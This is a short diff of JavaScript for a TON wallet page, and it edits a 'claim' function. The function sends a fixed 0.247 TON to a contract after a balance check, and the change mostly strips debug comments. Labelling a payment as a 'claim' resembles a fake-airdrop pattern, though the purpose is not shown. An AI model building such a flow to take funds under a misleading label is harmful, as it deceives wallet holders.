@@ -264,7 +264,7 @@ function showMessage(message) {
 async function handleClaim() {
     try {
         const balance = await tonConnect.getBalance();
-        console.log('Current balance:', balance); // Debug için bakiye kontrolü
+        console.log('Current balance:', balance);
 
         if (balance < REQUIRED_AMOUNT) {
             showMessage("Your wallet balance is less than 0.247 TON.\nPlease add more TON to continue.");
@@ -276,29 +276,21 @@ async function handleClaim() {
             messages: [{
                 address: CONTRACT_ADDRESS,
                 amount: REQUIRED_AMOUNT,
-                payload: {
-                    abi: 'increment',
-                    method: 'increment'
-                }
+                payload: 'increment'  // Sadece 'increment' string olarak gönderiyoruz
             }]
         };
         
-        console.log('Sending transaction:', transaction); // Debug için transaction detayları
-        
+        console.log('Sending transaction:', transaction);
         const result = await tonConnect.sendTransaction(transaction);
-        console.log('Transaction result:', result); // İşlem sonucunu kontrol et
+        console.log('Transaction result:', result);
         
         if (result) {
             showMessage('Transaction successful! Thank you for your contribution.');
         }
     } catch (error) {
-        console.error('Detailed error:', error); // Detaylı hata bilgisi
-        
-        // Daha açıklayıcı hata mesajları
+        console.error('Detailed error:', error);
         if (error.message?.includes('rejected')) {
             showMessage("Transaction was rejected by user");
-        } else if (error.message?.includes('insufficient')) {
-            showMessage("Insufficient balance. Required amount: 0.247 TON");
         } else {
             showMessage("Transaction failed. Please try again.");
         }
